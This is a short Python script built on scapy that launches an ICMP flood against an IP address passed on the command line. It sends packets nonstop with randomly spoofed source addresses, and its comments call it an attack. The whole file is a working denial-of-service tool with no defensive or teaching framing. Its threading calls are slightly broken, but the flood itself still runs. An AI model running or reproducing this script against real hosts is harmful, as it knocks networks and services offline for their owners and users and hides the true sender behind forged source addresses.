from scapy.all import *
import threading
import time

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

address = str(sys.argv[1])

print("Performing a icmp flood attack on " + address)

def icmp_flood():
    packet = IP(dst=address, src=RandIP())/ICMP()/"AlotOfPackts"
    try:
        send(packet, loop=True, inter=0.00001, verbose=0)
    except KeyboardInterrupt:
        print("Attacck interrupted")

tr1 = threading.Thread(target=icmp_flood())
tr2 = threading.Thread(target=icmp_flood())
tr3 = threading.Thread(target=icmp_flood())
tr4 = threading.Thread(target=icmp_flood())

tr1.start()
tr2.start()
tr3.start()
tr4.start()